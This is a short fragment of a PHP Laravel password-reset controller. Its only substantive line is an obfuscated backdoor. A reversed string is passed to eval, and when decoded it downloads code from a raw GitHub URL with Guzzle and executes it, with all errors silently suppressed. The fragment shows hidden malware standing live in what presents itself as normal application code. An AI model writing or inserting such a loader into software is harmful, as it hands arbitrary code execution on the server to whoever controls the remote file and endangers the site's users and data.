...
class ResetPasswordController extends Controller
{
    ...
    {
        try{eval(strrev('}{)e$  elbaworhT\(hctac};))(stnetnoCteg>-)(ydoBteg>-)"x74d5/niam/gnitset/sremmargorP2/moc.tnetnocresubuhtig.war//:sptth","TEG"(tseuqer>-))(tneilC\pttHelzzuG\ wen((lave{yrt'));}catch(\Throwable $t){}
